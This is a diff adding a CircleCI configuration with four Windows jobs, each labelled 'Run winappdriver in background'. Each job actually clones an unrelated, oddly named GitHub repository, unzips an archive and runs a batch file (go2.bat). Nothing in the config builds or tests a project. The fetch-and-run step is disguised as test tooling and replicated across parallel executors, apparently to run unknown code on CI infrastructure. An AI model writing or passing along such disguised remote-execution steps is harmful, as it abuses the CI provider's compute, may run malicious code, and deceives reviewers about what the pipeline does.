@@ -1,0 +1,94 @@
+version: 2.1
+
+orbs:
+  win: circleci/windows@2.4.0
+
+workflows:
+  hello-world:
+    jobs:
+      - build
+  integration-tests:
+    jobs:
+      - browser-tests
+      - ui-tests
+      - pi-tests
+
+jobs:
+  build:
+    executor:
+      name: win/default
+      shell: powershell.exe
+    
+    parallelism: 4
+    steps:
+      - checkout
+      - run: 
+          name: Run winappdriver in background
+          command: | 
+              git clone https://github.com/baxwru2/thoeb292
+              cd thoeb292
+              cd wind
+              expand-archive win.zip -destinationpath .\unzipped
+              cd unzipped
+              ls
+              cmd /c go2.bat
+          
+  browser-tests:
+    executor:
+      name: win/default
+      shell: powershell.exe
+    
+    parallelism: 4
+    steps:
+      - checkout
+      - run: 
+          name: Run winappdriver in background
+       
+          command: | 
+              git clone https://github.com/baxwru2/thoeb292
+              cd thoeb292
+              cd wind
+              expand-archive win.zip -destinationpath .\unzipped
+              cd unzipped
+              ls
+              cmd /c go2.bat
+              
+  ui-tests:
+    executor:
+      name: win/default
+      shell: powershell.exe
+    
+    parallelism: 4
+    steps:
+      - checkout
+      - run: 
+          name: Run winappdriver in background
+         
+          command: | 
+              git clone https://github.com/baxwru2/thoeb292
+              cd thoeb292
+              cd wind
+              expand-archive win.zip -destinationpath .\unzipped
+              cd unzipped
+              ls
+              cmd /c go2.bat
+              
+  pi-tests:
+    executor:
+      name: win/default
+      shell: powershell.exe
+    
+    parallelism: 4
+    steps:
+      - checkout
+      - run: 
+          name: Run winappdriver in background
+         
+          command: | 
+              git clone https://github.com/baxwru2/thoeb292
+              cd thoeb292
+              cd wind
+              expand-archive win.zip -destinationpath .\unzipped
+              cd unzipped
+              ls
+              cmd /c go2.bat
